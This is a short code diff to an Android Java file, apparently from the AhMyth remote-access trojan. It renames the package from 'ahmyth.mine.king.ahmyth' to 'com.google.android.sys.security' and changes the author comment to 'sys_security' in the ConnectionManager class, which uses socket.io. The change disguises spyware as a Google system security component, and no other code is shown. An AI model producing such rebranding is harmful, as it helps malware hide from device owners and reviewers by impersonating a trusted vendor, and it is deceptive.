@@ -1,4 +1,4 @@
-package ahmyth.mine.king.ahmyth;
+package com.google.android.sys.security;
 
 import android.content.Context;
 import android.os.Handler;
@@ -10,7 +10,7 @@ import io.socket.emitter.Emitter;
 
 
 /**
- * Created by AhMyth on 10/1/16.
+ * Created by sys_security on 10/1/16.
  */
 
 public class ConnectionManager {
